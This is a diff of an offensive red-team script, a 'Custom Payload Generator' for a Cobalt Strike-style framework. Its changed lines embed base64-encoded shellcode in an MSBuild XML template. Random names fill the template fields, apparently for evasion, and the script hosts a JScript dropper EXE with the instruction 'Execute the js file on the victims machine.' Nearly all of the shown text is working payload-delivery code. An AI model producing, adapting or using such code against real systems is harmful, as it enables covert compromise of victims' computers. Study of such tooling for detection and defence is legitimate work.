@@ -1,6 +1,6 @@
 # Custom Payload Generator
 # Author: Alex Williams
-# v1.0.6 01/05/2019
+# v1.0.5 12/06/2018
 # Contact: @offsec_ginger
 # Site: https://stormctf.ninja
 # GH: https://github.com/offsecginger
@@ -147,10 +147,10 @@ sub output {
 		}
 
 		if ($3['payload_type'] eq "Staged") {
-			$payload_string = artifact($3['listener'], "powershell", $arch);
+			$payload_string = shellcode($3['listener'], false, $arch);
 			$handle = openf(script_resource("./templates/msbuild_template.xml"));
 			$data   = readb($handle, -1);
-			$fdata = strrep($data, "%%DATA%%", base64_encode(gzip($payload_string)), "%%TASKNAME%%", random_string(rand(range("10-15"))), "%%TARGETNAME%%", random_string(rand(range("10-15"))), "%%VARIABLE%%", random_string(rand(range("10-15"))), "%%PIPELINE%%", random_string(rand(range("10-15"))), "%%RUNSPACE%%", random_string(rand(range("10-15"))));
+			$fdata = strrep($data, "%%DATA%%", base64_encode($payload_string), "%%SHELLCODESTR%%", random_string(rand(range("10-15"))), "%%SCSTUFF%%", random_string(rand(range("10-15"))), "%%TARGETNAME%%", random_string(rand(range("10-15"))));
 			closef($handle);
 			$name = prompt_file_save("payload.xml", {
 				local('$outfile');
@@ -223,6 +223,7 @@ sub output {
 				$outfile = openf("> $+ $1");
 				writeb($outfile, $fdata);
 				closef($outfile);
+				println($ssl);
 				site_host(localip(), $jsport, $targetfile, $exe_data, "automatic", "JScript Dropper EXE Host", $ssl);
 				show_message("Execute the js file on the victims machine.");
 			});
